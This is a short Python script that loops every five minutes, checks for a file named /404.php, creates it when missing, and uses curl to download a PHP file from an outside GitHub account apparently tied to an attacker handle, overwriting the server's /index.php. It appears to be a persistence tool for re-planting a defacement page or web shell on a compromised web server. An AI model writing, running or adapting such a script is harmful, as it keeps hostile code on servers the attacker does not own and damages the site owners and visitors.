import os
import time
import os.path

def main():
    while True:
        f = os.path.exists('/404.php') 
        
        if f == True:
            print("[*] file exists")
            pass
            time.sleep(300)
            
        else:
            print("[!] file not found")
            print("[!] creating file")
            
            a = open('/404.php','a') 
            
            
            a.close()
            
            os.system('curl "https://raw.githubusercontent.com/sniper404ghostxploit/www/main/sexy.php" > /index.php')
            
            time.sleep(300)
            
main()